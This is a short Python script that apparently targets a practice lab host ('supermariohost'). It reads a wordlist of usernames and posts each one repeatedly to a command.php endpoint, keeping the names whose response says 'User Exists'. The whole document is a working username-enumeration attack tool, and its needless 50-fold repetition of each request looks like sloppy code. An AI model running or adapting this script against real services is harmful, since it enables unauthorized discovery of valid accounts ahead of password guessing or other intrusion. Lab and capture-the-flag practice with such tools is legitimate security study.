#!/usr/bin/python

import requests
import sys


usernames = open(sys.argv[1], 'r')
foundUsernames = []

for user in usernames:
   for i in range(0,50,1):
      payload = {'username':user.strip(), 'submit':'Search'}
      r = requests.post('http://mario.supermariohost.local:8180/command.php', params = payload)
      if 'User Exists' in r.text:
         foundUsernames.append(user.strip())

uniqueSet = sorted(set(foundUsernames))
for user in uniqueSet:
   print user.strip()
